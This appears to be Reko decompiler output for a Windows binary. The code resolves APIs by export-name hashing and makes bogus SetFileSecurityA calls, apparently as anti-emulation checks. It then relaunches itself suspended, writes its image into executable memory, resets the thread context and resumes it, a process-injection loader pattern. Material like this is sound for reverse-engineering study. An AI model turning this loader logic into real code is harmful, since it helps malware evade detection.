// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Register word32 ebp)
void fn00401000(word32 ebp)
{
	lstrcpyA(fp - 0x30, globals->t404058);
	Eq_13 eax_25 = LoadLibraryA(fp - 0x30);
	Eq_13 ebx_27 = eax_25;
	if (eax_25 == null)
	{
		lstrcatA(fp - 0x30, globals->t404018);
		LoadLibraryA(fp - 0x30);
		lstrcatA(fp - 0x30, globals->t404038);
		ebx_27 = LoadLibraryA(fp - 0x30);
	}
	globals->ptr4041B0 = fn00401590(ebx_27, 3150609704);
	globals->ptr4041B4 = fn00401590(ebx_27, 0x67444F49);
	globals->ptr4041B8 = fn00401590(ebx_27, 1105085134);
	globals->ptr4041BC = fn00401590(ebx_27, 1474698708);
	globals->ptr4041C0 = fn00401590(ebx_27, 1474704852);
	globals->ptr4041C4 = fn00401590(ebx_27, 2921547988);
	globals->ptr4041C8 = fn00401590(ebx_27, 861160042);
	globals->ptr4041CC = fn00401590(ebx_27, 1077640438);
	globals->ptr4041D0 = fn00401590(ebx_27, 0x1D0777C9);
	globals->ptr4041D4 = fn00401590(ebx_27, 2081088331);
	globals->ptr4041D8 = fn00401590(ebx_27, 0x7C0EA5CB);
	globals->ptr4041DC = fn00401590(ebx_27, 2112613963);
	globals->ptr4041E0 = fn00401590(ebx_27, 0x6D383070);
	globals->ptr4041E4 = fn00401590(ebx_27, 1578876749);
	globals->ptr4041E8 = fn00401590(ebx_27, 0x545BA730);
	globals->ptr4041EC = fn00401590(ebx_27, 3713246971);
	globals->ptr4041F0 = fn00401590(ebx_27, 1519683438);
	globals->ptr4041F4 = fn00401590(ebx_27, 2811619130);
	ptr32 esp_374;
	word32 ebp_375;
	byte SCZO_376;
	word32 ebx_377;
	word32 esi_378;
	word32 eax_379;
	byte SZO_380;
	bool C_381;
	bool Z_382;
	word32 edx_383;
	word32 ecx_384;
	byte cl_385;
	globals->ptr4041D8();
	*(esp_374 - 0x04) = globals->dw404008;
	*(esp_374 - 0x08) = fp - 0x30;
	ptr32 esp_405;
	word32 ebp_406;
	byte SCZO_407;
	word32 ebx_408;
	word32 esi_409;
	word32 eax_410;
	byte SZO_411;
	bool C_412;
	bool Z_413;
	word32 edx_414;
	word32 ecx_415;
	byte cl_416;
	globals->ptr4041D4();
	*(esp_405 - 0x04) = globals->dw40402C;
	*(esp_405 - 0x08) = fp - 0x30;
	ptr32 esp_436;
	word32 ebp_437;
	byte SCZO_438;
	word32 ebx_439;
	word32 esi_440;
	word32 eax_441;
	byte SZO_442;
	bool C_443;
	bool Z_444;
	word32 edx_445;
	word32 ecx_446;
	byte cl_447;
	globals->ptr4041D4();
	*(esp_436 - 0x04) = globals->dw40400C;
	*(esp_436 - 0x08) = fp - 0x30;
	ptr32 esp_458;
	word32 ebp_459;
	byte SCZO_460;
	word32 ebx_461;
	word32 esi_462;
	word32 eax_463;
	byte SZO_464;
	bool C_465;
	bool Z_466;
	word32 edx_467;
	word32 ecx_468;
	byte cl_469;
	globals->ptr4041D4();
	*(esp_458 - 0x04) = fp - 0x30;
	ptr32 esp_488;
	word32 ebp_489;
	byte SCZO_490;
	word32 ebx_491;
	word32 esi_492;
	word32 eax_493;
	byte SZO_494;
	bool C_495;
	bool Z_496;
	word32 edx_497;
	word32 ecx_498;
	byte cl_499;
	globals->ptr4041D0();
	*(esp_488 - 0x04) = 0xC1B23174;
	*(esp_488 - 0x08) = eax_493;
	globals->ptr4041F8 = fn00401590(dwArg00, dwArg04);
	*(esp_488 - 0x04) = 3718433336;
	*(esp_488 - 0x08) = eax_493;
	globals->ptr4041FC = fn00401590(dwArg00, dwArg04);
	*(esp_488 - 0x04) = 1166426269;
	*(esp_488 - 0x08) = eax_493;
	globals->ptr404200 = fn00401590(dwArg00, dwArg04);
	*(esp_488 - 0x04) = 3889878169;
	*(esp_488 - 0x08) = eax_493;
	globals->ptr404204 = fn00401590(dwArg00, dwArg04);
	*(esp_488 - 0x04) = 0xCC6A06F6;
	*(esp_488 - 0x08) = eax_493;
	globals->ptr404208 = fn00401590(dwArg00, dwArg04);
	*(esp_488 - 0x04) = globals->dw404030;
	ptr32 esp_603;
	word32 ebp_604;
	byte SCZO_605;
	word32 ebx_606;
	word32 esi_607;
	word32 eax_608;
	byte SZO_609;
	bool C_610;
	bool Z_611;
	word32 edx_612;
	word32 ecx_613;
	byte cl_614;
	globals->ptr4041D0();
	*(esp_603 - 0x04) = 2196782966;
	*(esp_603 - 0x08) = eax_608;
	globals->ptr40420C = fn00401590(dwArg00, dwArg04);
	fn0040174D();
	*(esp_603 - 0x04) = 0x00;
	word32 esp_657;
	word32 ebp_658;
	byte SCZO_659;
	word32 ebx_660;
	word32 esi_661;
	word32 eax_662;
	byte SZO_663;
	bool C_664;
	bool Z_665;
	word32 edx_666;
	word32 ecx_667;
	byte cl_668;
	globals->ptr4041CC();
}

// 00401590: Register word32 fn00401590(Stack Eq_13 dwArg04, Stack uint32 dwArg08)
word32 fn00401590(HMODULE dwArg04, uint32 dwArg08)
{
	ptr32 v5_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	struct Eq_404 * eax_63 = dwArg04 + (&(dwArg04 + (&dwArg04->unused)[0x0F] / 0x04)->unused)[0x001E] / 0x04;
	word16 eax_67[] = dwArg04 + eax_63->dw0024 / 0x04;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 = dwArg08 + 0x000A0D40;
	if (SetFileSecurityA((CHAR *) 666, 0x00, null) == 0x00)
		dwArg08 = dwArg08 + 0x00075AAC;
	word32 eax_116[] = dwArg04 + eax_63->dw0020 / 0x04;
	word32 eax_121[] = dwArg04 + eax_63->dw001C / 0x04;
	int32 esi_123 = 0x00;
	while (true)
	{
		word32 eax_151;
		if (esi_123 >= eax_63->dw0018)
			break;
		uint32 eax_173 = 0x00;
		Eq_478 (* ecx_179)[] = dwArg04 + eax_116[esi_123] / 0x04;
		dwLoc38 = dwLoc38 & 0x00;
		while (Mem17[dwLoc38 + ecx_179:byte] != 0x00)
		{
			eax_173 = (eax_173 << 0x07 | eax_173 >>u 0x19) ^ ((int32) Mem17[dwLoc38 + ecx_179:byte] ^ 0x05);
			dwLoc38 = dwLoc38 + 0x01;
		}
		if (eax_173 == dwArg08)
		{
			eax_151 = dwArg04 + eax_121[(word32) eax_67[esi_123]] / 0x04;
			goto l0040173A;
		}
		esi_123 = esi_123 + 0x01;
	}
	eax_151 = 0x00;
l0040173A:
	fs->ptr0000 = v5_14;
	return eax_151;
}

// 0040174D: void fn0040174D()
void fn0040174D()
{
	GetModuleFileNameA(null, &globals->t404210, 0x0104);
	ptr32 esp_48;
	word32 ebp_49;
	byte SCZO_50;
	word32 ebx_51;
	word32 esi_52;
	word32 edi_53;
	word32 eax_54;
	word32 edx_55;
	word32 ecx_56;
	byte cl_57;
	bool C_58;
	byte SZO_59;
	globals->ptr4041D8();
	*(esp_48 - 0x04) = globals->dw40404C;
	*(esp_48 - 0x08) = 0x00404314;
	ptr32 esp_79;
	word32 ebp_80;
	byte SCZO_81;
	word32 ebx_82;
	word32 esi_83;
	word32 edi_84;
	word32 eax_85;
	word32 edx_86;
	word32 ecx_87;
	byte cl_88;
	bool C_89;
	byte SZO_90;
	globals->ptr4041D4();
	*(esp_79 - 0x04) = globals->dw404024;
	*(esp_79 - 0x08) = 0x00404314;
	ptr32 esp_109;
	word32 ebp_110;
	byte SCZO_111;
	word32 ebx_112;
	word32 esi_113;
	word32 edi_114;
	word32 eax_115;
	word32 edx_116;
	word32 ecx_117;
	byte cl_118;
	bool C_119;
	byte SZO_120;
	globals->ptr4041D4();
	*(esp_109 - 0x04) = globals->dw404020;
	*(esp_109 - 0x08) = 0x00404314;
	ptr32 esp_132;
	word32 ebp_133;
	byte SCZO_134;
	word32 ebx_135;
	word32 esi_136;
	word32 edi_137;
	word32 eax_138;
	word32 edx_139;
	word32 ecx_140;
	byte cl_141;
	bool C_142;
	byte SZO_143;
	globals->ptr4041D4();
	*(esp_132 - 0x04) = 0x00404210;
	*(esp_132 - 0x08) = 0x00404314;
	ptr32 esp_162;
	word32 ebp_163;
	byte SCZO_164;
	word32 ebx_165;
	word32 esi_166;
	word32 edi_167;
	word32 eax_168;
	word32 edx_169;
	word32 ecx_170;
	byte cl_171;
	bool C_172;
	byte SZO_173;
	globals->ptr4041D4();
	globals->dw404418 = 0x44;
	globals->dw404444 = 0x01;
	globals->w404448 = 0x02;
	*(esp_162 - 0x04) = 0x0040445C;
	*(esp_162 - 0x08) = 0x00404418;
	*(esp_162 - 0x0C) = 0x00;
	*(esp_162 - 0x10) = 0x00;
	*(esp_162 - 0x14) = 0x04;
	*(esp_162 - 0x18) = 0x00;
	*(esp_162 - 0x1C) = 0x00;
	*(esp_162 - 0x20) = 0x00;
	*(esp_162 - 0x24) = 0x00404314;
	*(esp_162 - 0x28) = 0x00;
	ptr32 esp_238;
	word32 ebp_239;
	byte SCZO_240;
	word32 ebx_241;
	word32 esi_242;
	word32 edi_243;
	word32 eax_244;
	word32 edx_245;
	word32 ecx_246;
	byte cl_247;
	bool C_248;
	byte SZO_249;
	globals->ptr4041B0();
	*(esp_238 - 0x04) = 0x00;
	Eq_13 eax_264 = GetModuleHandleA(*(esp_238 - 0x04));
	Eq_726 eax_285 = eax_264 + (&eax_264->unused)[0x0F] / 0x04;
	*(esp_238 - 0x04) = 0x40;
	*(esp_238 - 0x08) = 0x3000;
	*(esp_238 - 0x0C) = eax_285->dw0050;
	*(esp_238 - 0x10) = (HMODULE *) eax_264;
	*(esp_238 - 0x14) = globals->dw40445C;
	ptr32 esp_306;
	word32 ebp_307;
	byte SCZO_308;
	word32 ebx_309;
	struct Eq_767 * esi_310;
	word32 edi_311;
	word32 eax_312;
	word32 edx_313;
	word32 ecx_314;
	byte cl_315;
	bool C_316;
	byte SZO_317;
	globals->ptr4041B4();
	*(esp_306 - 0x04) = fp - 0x14;
	*(esp_306 - 0x08) = esi_310->dw0050;
	*(esp_306 - 0x0C) = ebx_309;
	*(esp_306 - 0x10) = eax_312;
	*(esp_306 - 0x14) = globals->dw40445C;
	ptr32 esp_358;
	word32 ebp_359;
	byte SCZO_360;
	word32 ebx_361;
	word32 esi_362;
	word32 edi_363;
	word32 eax_364;
	word32 edx_365;
	word32 ecx_366;
	byte cl_367;
	bool C_368;
	byte SZO_369;
	globals->ptr4041B8();
	globals->dw40446C = 0x00010007;
	*(esp_358 - 0x04) = 0x0040446C;
	*(esp_358 - 0x08) = globals->dw404460;
	ptr32 esp_394;
	word32 ebp_395;
	byte SCZO_396;
	word32 ebx_397;
	word32 esi_398;
	word32 edi_399;
	word32 eax_400;
	word32 edx_401;
	word32 ecx_402;
	byte cl_403;
	bool C_404;
	byte SZO_405;
	globals->ptr4041BC();
	globals->dw404524 = 4202082;
	*(esp_394 - 0x04) = 0x0040446C;
	*(esp_394 - 0x08) = globals->dw404460;
	ptr32 esp_435;
	word32 ebp_436;
	byte SCZO_437;
	word32 ebx_438;
	word32 esi_439;
	word32 edi_440;
	word32 eax_441;
	word32 edx_442;
	word32 ecx_443;
	byte cl_444;
	bool C_445;
	byte SZO_446;
	globals->ptr4041C0();
	*(esp_435 - 0x04) = globals->dw404460;
	word32 esp_464;
	word32 ebp_465;
	byte SCZO_466;
	word32 ebx_467;
	word32 esi_468;
	word32 edi_469;
	word32 eax_470;
	word32 edx_471;
	word32 ecx_472;
	byte cl_473;
	bool C_474;
	byte SZO_475;
	globals->ptr4041C4();
}

